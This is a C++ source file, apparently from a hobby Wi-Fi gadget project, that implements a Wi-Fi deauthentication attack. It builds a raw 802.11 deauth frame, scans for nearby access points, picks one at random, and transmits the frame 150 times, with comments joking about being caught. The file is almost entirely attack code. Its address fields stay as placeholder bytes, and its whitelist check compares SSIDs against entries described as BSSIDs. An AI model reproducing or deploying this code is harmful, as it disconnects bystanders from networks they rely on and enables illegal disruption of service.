/**
 * deauth.cpp: handles the deauth of a local AP
*/

#include "deauth.h"

/** developer note: 
 * 
 * the deauth frame is defined here.
 * this is a raw frame(layer 2)
 * man i hate networking
 *
*/

// default values before we start
bool Deauth::running = false;
std::vector<String> Deauth::whitelist = {};
String Deauth::randomAP = "";

uint8_t Deauth::deauthFrame[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

void Deauth::add(const std::string& bssids) {
    std::stringstream ss(bssids);
    std::string token;

    // seperate info and whitelist
    while (std::getline(ss, token, ',')) {
        // trim out whitespace
        token.erase(0, token.find_first_not_of(" \t\r\n"));
        token.erase(token.find_last_not_of(" \t\r\n") + 1);

        // add to whitelist
        Serial.print("('-') Adding ");
        Serial.print(token.c_str());
        Serial.println(" to the whitelist");
        whitelist.push_back(token.c_str());
    }
}

void Deauth::list() {
    for (const auto& bssid : Config::whitelist) {
        Deauth::add(bssid);
    }
}

void Deauth::select() {
    // cool animation 
    for (int i = 0; i < 5; ++i) {
        Serial.println("(0-o) Scanning for APs.");
        delay(250);
        Serial.println("(o-0) Scanning for APs..");
        delay(250);
        Serial.println("(0-o) Scanning for APs...");
        delay(250);
        Serial.println(" ");
        delay(250);
    }

    delay(5000);

    // stop and scan
    Minigotchi::monStop();
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        // check for ap in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
            Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
            return;
        }
        Serial.print("('-') Selected random AP: ");
        Serial.println(randomAP.c_str());
        Serial.println(" ");
    } else {
        // well ur fucked.
        Serial.println("(;-;) No access points found.");
        Serial.println(" ");
    }
}

void Deauth::deauth() {
    if (Config::deauth) {
       // select AP
        Deauth::select();
        
        if (randomAP.length() > 0) {
            Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
            Serial.println(" ");
            delay(5000);
            // define the attack
            if (!running) {
                start();
            } else {
                Serial.println("(X-X) Attack is already running");
                Serial.println(" ");
                delay(5000);
            }
        } else {
            // ok why did you modify the deauth function? i literally told you to not do that...
            Serial.println("(X-X) Unable to find access point");
            Serial.println(" ");
            delay(5000);
        } 
    } else {
        // do nothing if deauthing is disabled
    }
}

void Deauth::start() {
    running = true;
    int frameSize = sizeof(deauthFrame);

    // send the deauth 150 times(ur cooked if they find out)
    for (int i = 0; i < 150; ++i) {
        WiFi.rawPacket(deauthFrame, sizeof(deauthFrame));
        Serial.println("(>-<) Sent Deauth Frame!");
        delay(100);
    }
    Serial.println(" ");
    Serial.println("(^-^) Attack finished!");
    Serial.println(" ");
    running = false;
}